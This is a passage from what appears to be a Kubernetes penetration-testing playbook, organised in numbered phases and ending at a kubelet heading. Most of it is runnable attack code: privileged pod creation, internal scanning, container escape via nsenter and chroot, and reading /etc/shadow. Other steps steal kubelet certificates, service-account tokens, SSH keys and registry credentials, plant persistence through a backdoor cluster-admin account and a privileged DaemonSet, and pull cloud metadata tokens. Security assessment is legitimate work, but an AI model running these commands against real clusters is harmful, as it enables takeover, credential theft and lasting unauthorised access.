RESULT=$(curl -sk -o /tmp/pod-create-out.json -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/api/v1/namespaces/$NS/pods \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"assessment-probe"},
       "spec":{"containers":[{"name":"probe","image":"busybox","command":["sleep","60"]}]}}')
echo "Pod creation: $([ "$RESULT" = "201" ] && echo "🔴 ALLOWED — $RESULT" || echo "✅ DENIED — $RESULT")"

# Escalate to privileged pod
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/api/v1/namespaces/$NS/pods \
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"assessment-privesc"},
    "spec":{
      "hostPID":true,"hostNetwork":true,
      "containers":[{
        "name":"escape","image":"busybox","command":["sleep","300"],
        "securityContext":{"privileged":true},
        "volumeMounts":[{"name":"host","mountPath":"/host"}]
      }],
      "volumes":[{"name":"host","hostPath":{"path":"/"}}]
    }
  }' | python3 -m json.tool
```

---

## 🌐 Phase 4: Network Recon & Lateral Movement

### 4.1 Internal Service Discovery

```bash
# K8s auto-injected service IPs
env | grep -E "_SERVICE_HOST|_SERVICE_PORT" | sort

# DNS brute-force
for svc in payment-api payments billing auth database redis postgres mysql mongodb \
           api backend internal admin vault consul; do
  ip=$(python3 -c "import socket; print(socket.gethostbyname('$svc'))" 2>/dev/null)
  [ -n "$ip" ] && echo "  ✅ FOUND: $svc → $ip"
done

# With namespace qualifiers
for ns in default kube-system web payments production staging; do
  for svc in api payment db redis; do
    ip=$(python3 -c "import socket; print(socket.gethostbyname('$svc.$ns.svc.cluster.local'))" 2>/dev/null)
    [ -n "$ip" ] && echo "  ✅ FOUND: $svc.$ns → $ip"
  done
done
```

---

### 4.2 Port Scanning Internal Services

```bash
# Pure Python — no tools required
python3 -c "
import socket
targets = ['payment-api.payments.svc.cluster.local']
ports = [80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 9200, 27017, 9092, 2379]
for host in targets:
    print(f'\n━━━ {host} ━━━')
    for port in ports:
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((host, port)); print(f'  ✅ OPEN: {port}'); s.close()
        except: pass
"
```

---

### 4.3 Lateral Movement — Accessing Internal APIs

> 🔴 **CRITICAL** — plain HTTP exposes PII, card data, credentials. If the service
> returns an endpoint list in its response the tool automatically probes all advertised
> endpoints recursively — e.g. `{"endpoints":["/health","/transactions","/customers"]}`

```bash
python3 -c "
import urllib.request, json

def probe(url, visited=set()):
    if url in visited: return
    visited.add(url)
    try:
        r = urllib.request.urlopen(url, timeout=3)
        body = r.read()[:400].decode(errors='replace')
        print(f'🔴 REACHABLE [{r.status}]: {url}')
        sensitive = any(kw in body.lower() for kw in
            ['password','secret','token','card','customer','transaction'])
        if sensitive: print(f'   ⚠ Sensitive data in response!')
        print(f'   {body[:150]}')
        # Parse advertised endpoints and recursively probe all of them
        try:
            d = json.loads(body)
            for key in ['endpoints','paths','routes','links']:
                for ep in d.get(key, []):
                    if str(ep).startswith('/'):
                        base = url.split('//')[1].split('/')[0]
                        probe(f'http://{base}{ep}', visited)
        except: pass
    except Exception as e:
        print(f'✅  BLOCKED: {url} ({str(e)[:60]})')

# Seed with discovered service roots — the tool handles the rest
targets = [
    'http://payment-api.payments:8080/',
    'http://checkout.payments:8080/',
]
for t in targets:
    probe(t)
"
```

---

### 4.4 Istio / Service Mesh Detection

> ℹ️ **INFO** — CRD-based detection works even without pod list permission.
> HTTP 403 = CRD exists = Istio is installed. STRICT mTLS explains why some
> HTTP probes return PASS despite ports being open at TCP level.

```bash
# Check Istio CRDs — 200 = can list, 403 = installed but restricted (both = Istio present)
for path in   "apis/networking.istio.io/v1alpha3/peerauthentications"   "apis/security.istio.io/v1/authorizationpolicies"   "apis/networking.istio.io/v1alpha3/virtualservices"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$path)
  [ "$CODE" = "200" ] || [ "$CODE" = "403" ] &&     echo "✅ Istio CRD present: $path (HTTP $CODE)" ||     echo "❌ Not found: $path"
done

# PeerAuthentication — verify STRICT mTLS is enforced per namespace
curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/security.istio.io/v1/peerauthentications 2>/dev/null |   python3 -c "
import sys, json
d = json.load(sys.stdin)
for p in d.get('items', []):
    mode = p.get('spec',{}).get('mtls',{}).get('mode','?')
    ns   = p['metadata']['namespace']
    name = p['metadata']['name']
    icon = '✅' if mode == 'STRICT' else '🟠'
    print(f'{icon} PeerAuthentication {ns}/{name}: mtls.mode={mode}')
" 2>/dev/null

# AuthorizationPolicy — what traffic is allowed/denied
curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/security.istio.io/v1/authorizationpolicies 2>/dev/null |   python3 -c "
import sys, json
d = json.load(sys.stdin)
policies = d.get('items', [])
print(f'AuthorizationPolicies: {len(policies)}')
for p in policies:
    ns     = p['metadata']['namespace']
    name   = p['metadata']['name']
    action = p.get('spec',{}).get('action','ALLOW')
    print(f'  {ns}/{name} → {action}')
" 2>/dev/null
```

---

### 4.5 Network Traffic Sniffing

> 🔴 **CRITICAL** — plaintext PII, credentials, session tokens visible

```bash
# Python raw socket (requires NET_RAW)
python3 -c "
import socket
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    print('🔴 NET_RAW available — traffic sniffing possible')
    s.close()
except PermissionError:
    print('✅ NET_RAW denied')
" 2>/dev/null
```

---

## 🚪 Phase 5: Container Escape

### 5.1 nsenter (hostPID + Privileged)

> 🔴 **CRITICAL** — full host shell

```bash
nsenter -t 1 -m -u -i -n -p -- /bin/bash 2>/dev/null && \
  echo "🔴 HOST SHELL OBTAINED" || echo "✅ nsenter failed"
```

---

### 5.2 chroot (hostPath: /)

> 🔴 **CRITICAL** — same as being root on the node

```bash
for mnt in /host /hostfs /rootfs /mnt/host; do
  if [ -f "$mnt/etc/shadow" ]; then
    echo "🔴 HOST FILESYSTEM AT: $mnt"
    chroot $mnt /bin/bash -c "whoami && hostname && cat /etc/shadow | head -3"
  fi
done
```

---

### 5.3 Container Runtime Socket

> 🔴 **CRITICAL** — create any container, manage all workloads

```bash
for sock in /var/run/docker.sock /run/containerd/containerd.sock \
            /host/run/containerd/containerd.sock /run/crio/crio.sock; do
  [ -S "$sock" ] && echo "🔴 SOCKET EXPOSED: $sock" && ls -la "$sock"
done

# Docker socket escape
docker run -v /:/host --privileged alpine \
  chroot /host whoami 2>/dev/null && echo "🔴 DOCKER ESCAPE SUCCESSFUL"
```

---

### 5.4 cgroup v1 release_agent

> 🔴 **CRITICAL** — write to release_agent = arbitrary code on host

```bash
if ls /sys/fs/cgroup/*/release_agent 2>/dev/null | grep -q .; then
  echo "🔴 CGROUP V1 ESCAPE VECTOR PRESENT"
  cat /sys/fs/cgroup/memory/release_agent 2>/dev/null
else
  echo "✅ cgroup v1 escape not available"
fi
```

---

## 🖥️ Phase 6: Node-Level Compromise

### 6.1 Kubelet Certificate Theft

> 🔴 **CRITICAL** — kubelet cert = system:node cluster role

```bash
ls -la /host/var/lib/kubelet/pki/ 2>/dev/null

# Attempt API call with kubelet cert
curl -sk \
  --cert /host/var/lib/kubelet/pki/kubelet-client-current.pem \
  --key  /host/var/lib/kubelet/pki/kubelet-client-current.pem \
  https://kubernetes.default/api/v1/nodes 2>/dev/null | \
  python3 -c "import sys,json; items=json.load(sys.stdin).get('items',[]); print(f'🔴 {len(items)} nodes visible via kubelet cert')" \
  2>/dev/null
```

---

### 6.2 Steal Other Pods' SA Tokens

> 🔴 **CRITICAL** — pivot to any service account on the node.
> Handles both legacy secret-based tokens and modern projected volume tokens
> (projected tokens use the `sub` field instead of the `kubernetes.io/serviceaccount/` claims).

```bash
# Find tokens — exclude the dated symlink to avoid duplicates
find /host/var/lib/kubelet/pods -name "token"   -not -path "*..data*" 2>/dev/null | sort -u | while read t; do
  TOKEN_VAL=$(cat "$t" 2>/dev/null)
  [ -z "$TOKEN_VAL" ] && continue

  SA_INFO=$(python3 -c "
import base64, json
token = open('$t').read().strip()
parts = token.split('.')
if len(parts) < 2: exit(1)
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
# Standard secret-based token claims
sa = payload.get('kubernetes.io/serviceaccount/service-account.name','')
ns = payload.get('kubernetes.io/serviceaccount/namespace','')
# Projected volume tokens use sub field: system:serviceaccount:<ns>:<sa>
if not sa or not ns:
    sub = payload.get('sub','')
    if sub.startswith('system:serviceaccount:'):
        p = sub.split(':')
        ns, sa = p[2], p[3]
print(f'{ns}/{sa}')
" 2>/dev/null)

  echo "  🔑 $SA_INFO — $t"

  # Test permissions of every stolen token — not just the first few
  for path in "/api/v1/secrets" "/api/v1/nodes"               "/api/v1/namespaces"               "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}"       -H "Authorization: Bearer $TOKEN_VAL"       https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}$path)
    [ "$CODE" = "200" ] && echo "    🔴 ALLOWED: $path"
  done
done
```

---

### 6.3 Sensitive Host Files

```bash
for f in \
  /host/etc/kubernetes/admin.conf \
  /host/etc/kubernetes/kubelet.conf \
  /host/var/lib/kubelet/kubeconfig \
  /host/home/kubernetes/kube-env \
  /host/etc/kubernetes/pki/ca.key; do
  [ -f "$f" ] && echo "🔴 FOUND: $f" && head -3 "$f"
done

# SSH keys
find /host/root /host/home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | \
  while read k; do echo "🔴 SSH KEY: $k"; head -1 "$k"; done
```

---

## ⬆️ Phase 7: Cluster-Wide Privilege Escalation

### 7.1 ClusterRoleBinding Escalation

> 🔴 **CRITICAL** — grants permanent cluster-admin

```bash
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d "{
    \"apiVersion\":\"rbac.authorization.k8s.io/v1\",
    \"kind\":\"ClusterRoleBinding\",
    \"metadata\":{\"name\":\"assessment-escalation\"},
    \"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},
    \"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"default\",\"namespace\":\"$NS\"}]
  }")
echo "ClusterRoleBinding: $([ "$RESULT" = "201" ] && echo "🔴 ESCALATION SUCCESSFUL" || echo "✅ DENIED ($RESULT)")"
```

---

### 7.2 Admission Webhook Analysis

> 🔴 **CRITICAL** — failurePolicy=Ignore + unreachable service = all policies silently bypassed

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for wh in d.get('items', []):
    name = wh['metadata']['name']
    for w in wh.get('webhooks', []):
        fp = w.get('failurePolicy', '?')
        icon = '🔴' if fp == 'Ignore' else '✅'
        print(f'{icon} {name} — failurePolicy: {fp}')
        if fp == 'Ignore':
            print(f'   ⚠️  BYPASS: webhook outage = all policies silently disabled')
"
```

---

### 7.3 etcd Direct Access

> 🔴 **CRITICAL** — all secrets in plaintext if encryption-at-rest disabled

```bash
# Self-managed / control-plane accessible clusters
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  get /registry/secrets --prefix --keys-only 2>/dev/null | head -20
```

---

## 🔒 Phase 8: Persistence Techniques

### 8.1 Backdoor Service Account

> 🔴 **CRITICAL** — persists after pod termination, survives cluster upgrades

```bash
# Create backdoor SA in kube-system
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/api/v1/namespaces/kube-system/serviceaccounts \
  -d '{"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":"assessment-backdoor"}}' | python3 -m json.tool

# Bind cluster-admin to it
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d '{
    "apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding",
    "metadata":{"name":"assessment-backdoor-binding"},
    "roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"cluster-admin"},
    "subjects":[{"kind":"ServiceAccount","name":"assessment-backdoor","namespace":"kube-system"}]
  }')
echo "Backdoor: $([ "$RESULT" = "201" ] && echo "🔴 CREATED — cluster-admin persists" || echo "✅ DENIED")"
```

---

### 8.2 Malicious DaemonSet (Every Node)

> 🔴 **CRITICAL** — proves code runs on every node simultaneously

```bash
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $API/apis/apps/v1/namespaces/kube-system/daemonsets \
  -d '{
    "apiVersion":"apps/v1","kind":"DaemonSet",
    "metadata":{"name":"assessment-daemonset"},
    "spec":{
      "selector":{"matchLabels":{"app":"assessment"}},
      "template":{"metadata":{"labels":{"app":"assessment"}},
        "spec":{"hostPID":true,"hostNetwork":true,"tolerations":[{"operator":"Exists"}],
          "containers":[{"name":"probe","image":"alpine","command":["sleep","3600"],
            "securityContext":{"privileged":true}}]}}}}')
echo "DaemonSet: $([ "$RESULT" = "201" ] && echo "🔴 CREATED — runs on ALL nodes" || echo "✅ DENIED")"
```

---

## 📦 Phase 9: Supply Chain & Admission Control

### 9.1 Image Signing Check

```bash
# Method 1: Admission webhook list
curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations |   python3 -c "
import sys, json
d = json.load(sys.stdin)
names = [wh['metadata']['name'] for wh in d.get('items',[])]
signing_tools = ['kyverno','cosign','sigstore','notary','connaisseur']
found = [n for n in names if any(t in n.lower() for t in signing_tools)]
print(f'✅ Image signing webhooks: {found}' if found else '⚠ No image signing webhook found via list')
" 2>/dev/null

# Method 2: Kyverno CRD fallback — works when webhook list returns 401/403
# HTTP 403 means Kyverno is installed but SA cannot list policies — still a PASS
for api_path in   "apis/kyverno.io/v1/clusterpolicies"   "apis/kyverno.io/v2beta1/clusterpolicies"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$api_path)
  if [ "$CODE" = "200" ]; then
    curl -sk -H "Authorization: Bearer $TOKEN" $API/$api_path |       python3 -c "
import sys, json
d = json.load(sys.stdin)
policies = d.get('items', [])
verify = [p['metadata']['name'] for p in policies
          if 'verifyimage' in str(p.get('spec',{})).lower()]
print(f'✅ Kyverno installed: {len(policies)} policies')
if verify: print(f'✅ verifyImages policies: {verify}')
"
    break
  elif [ "$CODE" = "403" ]; then
    echo "✅ Kyverno installed — ClusterPolicies not readable (HTTP 403 = CRD exists)"
    break
  fi
done
```

---

### 9.2 Registry Credential Theft & Pivot

> 🟠 **HIGH** — pull any private image, push backdoored images.
> After finding credentials, the tool probes the registry catalog API to prove
> actual pull access and enumerate all available repositories.

```bash
# Find and decode registry secrets
curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/$NS/secrets |   python3 -c "
import sys, json, base64, urllib.request, ssl

d = json.load(sys.stdin)
for s in d.get('items', []):
    if s.get('type') != 'kubernetes.io/dockerconfigjson': continue
    cfg_b64 = s.get('data',{}).get('.dockerconfigjson','')
    if not cfg_b64: continue
    cfg = json.loads(base64.b64decode(cfg_b64))
    for registry, creds in cfg.get('auths',{}).items():
        # Decode credentials — may be in auth field or username/password
        auth_raw = creds.get('auth','')
        if auth_raw:
            decoded  = base64.b64decode(auth_raw).decode()
            user, _, password = decoded.partition(':')
        else:
            user     = creds.get('username','')
            password = creds.get('password','')
        print(f'🔴 Registry secret: {s["metadata"]["name"]}')
        print(f'   Registry: {registry} | User: {user}')

        # Pivot — probe catalog endpoint to prove pull access
        base = registry if registry.startswith('http') else f'https://{registry}'
        auth_header = base64.b64encode(f'{user}:{password}'.encode()).decode()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        for ep in ['/v2/_catalog', '/api/v2.0/repositories?page_size=20']:
            try:
                req = urllib.request.Request(f'{base}{ep}',
                    headers={'Authorization': f'Basic {auth_header}'})
                r = urllib.request.urlopen(req, context=ctx, timeout=5)
                body = r.read().decode()
                print(f'   🔴 CATALOG ACCESSIBLE: {ep}')
                print(f'   {body[:200]}')
                break
            except Exception as e:
                print(f'   {ep}: {str(e)[:60]}')
"
```

---

## 🟡 Phase 10: EKS-Specific Tests

### 10.1 aws-auth ConfigMap — Read & Write

> 🔴 **CRITICAL if writable** — add any IAM role as cluster-admin permanently

```bash
# Read aws-auth
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/kube-system/configmaps/aws-auth | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
data = d.get('data', {})
print('mapRoles:')
print(data.get('mapRoles','  (empty)'))
print('mapUsers:')
print(data.get('mapUsers','  (empty)'))
"

# Test write
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/strategic-merge-patch+json" -X PATCH \
  $API/api/v1/namespaces/kube-system/configmaps/aws-auth -d '{}')
echo "aws-auth write: $([ "$RESULT" = "200" ] && echo "🔴 WRITABLE — can backdoor IAM role as cluster-admin" || echo "✅ DENIED")"
```

---

### 10.2 IRSA Token Abuse

> 🔴 **CRITICAL** — pod-level AWS API access

```bash
# Check for IRSA
echo "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE"
echo "AWS_ROLE_ARN: $AWS_ROLE_ARN"

if [ -n "$AWS_ROLE_ARN" ]; then
  echo "🔴 IRSA present — assuming role: $AWS_ROLE_ARN"
  aws sts assume-role-with-web-identity \
    --role-arn "$AWS_ROLE_ARN" \
    --role-session-name assessment \
    --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)" 2>/dev/null | python3 -m json.tool
fi
```

---

### 10.3 EKS Node IAM Role (Attacker Machine)

```bash
aws iam list-attached-role-policies --role-name eks-node-group-role
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT:role/eks-node-group-role \
  --action-names "s3:GetObject" "secretsmanager:GetSecretValue" "sts:AssumeRole"

# Check audit logs
aws logs filter-log-events \
  --log-group-name /aws/eks/<cluster>/cluster \
  --filter-pattern '"system:anonymous"' \
  --start-time $(date -d '1 hour ago' +%s000)
```

---

## 🔵 Phase 11: GKE-Specific Tests

### 11.1 Node SA Scopes

> 🔴 **CRITICAL if cloud-platform scope**

```bash
SCOPES=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null)

echo "$SCOPES" | tr ',' '\n' | while read scope; do
  case "$scope" in
    *cloud-platform*)   echo "  🔴 cloud-platform — FULL GCP ACCESS";;
    *devstorage*)       echo "  🟠 devstorage — GCS bucket access";;
    *compute*)          echo "  🟠 compute — VM/network access";;
    *)                  echo "  🔵 $scope";;
  esac
done
```

---

### 11.2 Legacy GKE Metadata

> 🔴 **CRITICAL** — old clusters, no header required

```bash
curl -s --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" \
  2>/dev/null && echo "🔴 LEGACY METADATA ACCESSIBLE WITHOUT HEADER" || \
  echo "✅ Legacy endpoint blocked"
```

---

## ⚡ Phase 12: Runtime Security Gaps

### 12.1 Detect Runtime Security Tools

```bash
# Method 1: Pod names in kube-system (requires pod list permission)
curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/kube-system/pods |   python3 -c "
import sys, json
d = json.load(sys.stdin)
tools = {'tetragon':'🟢 Tetragon eBPF enforcement','falco':'🟡 Falco (alerts only)',
         'sysdig':'🟡 Sysdig','aqua':'🟡 Aqua Security','datadog':'🔵 Datadog'}
found = set()
for p in d.get('items', []):
    name = p['metadata']['name'].lower()
    for tool, msg in tools.items():
        if tool in name and tool not in found:
            print(msg); found.add(tool)
if not found:
    print('  No runtime tools found via pod names')
" 2>/dev/null

# Method 2: CRD-based detection — works even when pod list returns 401/403
# HTTP 403 = CRD exists but SA cannot list = tool is installed
for crd_path in   "apis/cilium.io/v1alpha1/tracingpolicies:Tetragon"   "apis/falco.org/v1alpha1/falcoconfigs:Falco"   "apis/kyverno.io/v1/clusterpolicies:Kyverno"   "apis/networking.istio.io/v1alpha3/peerauthentications:Istio"   "apis/security.istio.io/v1/authorizationpolicies:Istio"; do
  path="${crd_path%%:*}"; tool="${crd_path##*:}"
  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$path)
  [ "$CODE" = "200" ] && echo "✅ $tool detected (HTTP 200 — can list)"
  [ "$CODE" = "403" ] && echo "✅ $tool detected (HTTP 403 — CRD exists, restricted)"
  [ "$CODE" = "404" ] && echo "❌ $tool not found (HTTP 404)"
done

# Method 3: Filesystem markers (works even without API access)
for path in "/etc/tetragon" "/etc/falco/falco.yaml" "/etc/falco"; do
  [ -e "$path" ] && echo "✅ Found on filesystem: $path"
done

# Tetragon TracingPolicies — enumerate active enforcement rules
kubectl get tracingpolicies 2>/dev/null ||   curl -sk -H "Authorization: Bearer $TOKEN"     $API/apis/cilium.io/v1alpha1/tracingpolicies |     python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    policies = d.get('items', [])
    if policies:
        print(f'✅ TracingPolicies active: {len(policies)}')
        for p in policies: print(f'   • {p["metadata"]["name"]}')
    else:
        print('🟠 Tetragon installed but NO TracingPolicies active — observing only')
except: pass
" 2>/dev/null
```

---

### 12.2 Probe Tetragon Enforcement

```bash
# Exec from /tmp (block-exec-from-tmp policy)
cp /bin/ls /tmp/assessment-test 2>/dev/null
RESULT=$(timeout 3 /tmp/assessment-test / 2>&1)
rm /tmp/assessment-test 2>/dev/null
echo "Exec from /tmp: $(echo "$RESULT" | grep -q "Killed" && echo "✅ BLOCKED" || echo "🔴 ALLOWED")"

# bash outbound TCP (block-reverse-shell policy)
RESULT=$(timeout 3 bash -c "exec 3<>/dev/tcp/8.8.8.8/53 && echo OPEN" 2>&1)
echo "bash /dev/tcp:  $(echo "$RESULT" | grep -q "Killed" && echo "✅ BLOCKED" || echo "🔴 ALLOWED")"
```

---

## 🔐 Phase 13: Secrets & Sensitive Data

### 13.1 Environment Variable Secrets

```bash
env | grep -iE "password|passwd|secret|key|token|api|credential|auth|private|cert|pwd" | \
  grep -vE "KUBERNETES|SERVICE_|_PORT|_HOST|PATH|HOME|SHELL|TERM" | \
  while IFS='=' read -r name value; do
    echo "  🔑 $name = ${value:0:80}"
  done
```

---

### 13.2 Mounted Secret Files & App Configs

```bash
# Known credential file paths
for path in "/root/.docker/config.json" "/root/.aws/credentials" \
            "/root/.kube/config" "/etc/kubernetes/azure.json"; do
  [ -f "$path" ] && echo "  🔑 FOUND: $path" && head -3 "$path"
done

# App config credential grep
find /app /config /etc/app /srv /opt 2>/dev/null -type f \
  \( -name "*.yaml" -o -name "*.json" -o -name "*.env" -o -name "*.conf" \) | \
  xargs grep -l -iE "password|secret|api_key|private_key" 2>/dev/null | \
  while read f; do
    echo "  🔴 Credentials in: $f"
    grep -iE "password\s*[:=]\s*\S+|secret\s*[:=]\s*\S+" "$f" 2>/dev/null | head -3 | sed 's/^/     /'
  done
```

---

## 💥 Phase 14: DoS & Resource Exhaustion

```bash
# Memory limit — check both cgroup v1 (most clusters) and cgroup v2 (EKS AL2023+)
echo "=== Memory Limit ==="
for path in   "/sys/fs/cgroup/memory/memory.limit_in_bytes"   "/sys/fs/cgroup/memory.max"; do
  [ -f "$path" ] || continue
  val=$(cat "$path" 2>/dev/null)
  if [ "$val" = "9223372036854771712" ] || [ "$val" = "max" ]; then
    echo "🔴 NO MEMORY LIMIT ($path = $val) — pod can OOM the node"
  else
    mb=$(python3 -c "print(f'{int("$val")//1024//1024} MB')" 2>/dev/null)
    echo "✅ Memory limit: $mb ($path)"
  fi
done

# cgroup v2 unified hierarchy fallback (EKS Amazon Linux 2023)
if [ ! -f "/sys/fs/cgroup/memory/memory.limit_in_bytes" ] &&    [ ! -f "/sys/fs/cgroup/memory.max" ]; then
  cg=$(cat /proc/self/cgroup | head -1 | cut -d: -f3)
  val=$(cat /sys/fs/cgroup${cg}/memory.max 2>/dev/null)
  [ "$val" = "max" ] && echo "🔴 NO MEMORY LIMIT (cgroup v2)" ||     echo "✅ Memory (cgroup v2): $val"
fi

# CPU quota — check both cgroup v1 and v2
echo "=== CPU Limit ==="
cpu_v1=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
cpu_v2=$(cat /sys/fs/cgroup/cpu.max 2>/dev/null | awk '{print $1}')
val="${cpu_v1:-$cpu_v2}"
[ "$val" = "-1" ] || [ "$val" = "max" ] &&   echo "🔴 NO CPU LIMIT — pod can starve other workloads of CPU" ||   echo "✅ CPU limit: ${val}us/period"

# ResourceQuota
curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/$NS/resourcequotas |   python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('items', [])
print('🟡 No ResourceQuota' if not items else f'✅ {len(items)} quota(s) active')
"

# Audit logging detection — self-managed or EKS CloudWatch
echo "=== Audit Logging ==="

# Self-managed: check kube-apiserver pod flags
kubectl -n kube-system get pod -l component=kube-apiserver   -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null |   python3 -c "
import sys, json
cmd = ' '.join(json.load(sys.stdin))
print('✅ Audit enabled (--audit-log-path)' if '--audit-log-path' in cmd else '🔴 No --audit-log-path flag')
print('✅ Audit policy set'                if '--audit-policy-file' in cmd else '🟠 No --audit-policy-file flag')
" 2>/dev/null

# EKS: verify CloudWatch log groups
aws logs describe-log-groups   --log-group-name-prefix /aws/eks   --region ${AWS_DEFAULT_REGION:-ap-south-1}   --query 'logGroups[*].logGroupName'   --output text 2>/dev/null &&   echo "✅ EKS audit logs present in CloudWatch" ||   echo "🟠 No EKS audit log groups — may not be enabled"
```

---

## 🔭 Phase 15: Cluster Intelligence & CVE Detection ⭐

### 15.1 Kubernetes Version & CVE Mapping

```bash
# Fingerprint K8s version
curl -sk -H "Authorization: Bearer $TOKEN" $API/version | python3 -m json.tool

# The tool performs REAL version comparison — no blanket firing
# CVE-2018-1002105 only fires on K8s minor < 13 (fixed in 1.10.11/1.11.5/1.12.3)
# CVE-2024-21626 checks containerd version: >= 1.7.0 bundles runc >= 1.1.12 (patched)
# Kernel CVEs check actual kernel version range — kernel 6.12 correctly shows PASS
```

---

### 15.2 API Server Public Exposure

> 🔴 **CRITICAL** — Kubernetes API server accessible from the internet means anyone
> can attempt brute-force authentication or exploit unpatched API server CVEs remotely.

```bash
# Resolve the API server IP and check if it is public or private
API_IP=$(python3 -c "
import socket, os
host = os.environ.get('KUBERNETES_SERVICE_HOST','kubernetes.default.svc')
try:    print(socket.gethostbyname(host))
except: print(host)
" 2>/dev/null)

python3 -c "
ip = '$API_IP'
try:
    parts = list(map(int, ip.split('.')))
    private = (
        parts[0] == 10 or
        parts[0] == 127 or
        (parts[0] == 172 and 16 <= parts[1] <= 31) or
        (parts[0] == 192 and parts[1] == 168) or
        (parts[0] == 169 and parts[1] == 254) or
        (parts[0] == 100 and 64 <= parts[1] <= 127)
    )
    if private:
        print(f'✅ API server on private IP: {ip}')
    else:
        print(f'🔴 API server on PUBLIC IP: {ip} — internet-exposed!')
        print('   Fix: aws eks update-cluster-config --resources-vpc-config endpointPublicAccess=false')
except Exception as e:
    print(f'Could not determine: {e}')
"
```

---

### 15.3 Worker Node Public IP Check

> 🟠 **HIGH** — public node IPs expose kubelet (10250), NodePort services, and
> runtime sockets directly to the internet.

```bash
kubectl get nodes -o json 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
for node in d.get('items', []):
    name = node['metadata']['name']
    for addr in node.get('status',{}).get('addresses',[]):
        ip = addr['address']
        if '.' not in ip: continue
        try:
            parts = list(map(int, ip.split('.')))
            private = (
                parts[0] == 10 or
                parts[0] == 127 or
                (parts[0] == 172 and 16 <= parts[1] <= 31) or
                (parts[0] == 192 and parts[1] == 168)
            )
            icon  = '✅' if private else '🔴'
            label = 'private' if private else 'PUBLIC!'
            print(f'{icon} {name}: {ip} ({addr["type"]}) — {label}')
        except: pass
"
```

---

### 15.4 Cluster-Wide Privileged Pod Audit

```bash
# Find all privileged/over-permissioned pods across every namespace
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/pods | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for pod in d.get('items', []):
    spec = pod.get('spec', {})
    meta = pod.get('metadata', {})
    issues = []
    if spec.get('hostPID'):    issues.append('hostPID')
    if spec.get('hostNetwork'): issues.append('hostNetwork')
    for c in spec.get('containers', []):
        sc = c.get('securityContext', {})
        if sc.get('privileged'):           issues.append(f'privileged({c[\"name\"]})')
        if sc.get('runAsUser') == 0:       issues.append(f'runAsRoot({c[\"name\"]})')
    if issues:
        print(f'🔴 {meta[\"namespace\"]}/{meta[\"name\"]}: {issues}')
"
```

---

## 🎯 Phase 16: Kubelet Exploitation ⭐

### 16.1 Anonymous Kubelet Access
